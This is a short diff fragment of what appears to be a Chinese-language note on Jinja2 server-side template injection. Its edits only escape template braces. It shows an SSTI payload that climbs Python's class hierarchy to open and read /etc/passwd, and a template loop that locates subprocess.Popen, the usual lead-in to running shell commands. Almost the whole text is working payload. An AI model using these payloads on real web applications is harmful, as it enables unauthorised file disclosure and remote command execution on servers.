@@ -27,11 +27,11 @@ name={\{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd','r').read()}}
 ```
 查找`subprocess.Popen`
 ```
-{% for item in ''.__class__.__mro__[2].__subclasses__()%}
-        {%- if item.__name__ == 'Popen' -%}
+{\% for item in ''.__class__.__mro__[2].__subclasses__()%}
+        {\%- if item.__name__ == 'Popen' -%}
         {\{loop.index0}}{\{item}}
-{%- endif -%}
-    {% endfor %}
+{\%- endif -%}
+    {\% endfor %}
 ```
 
 shell
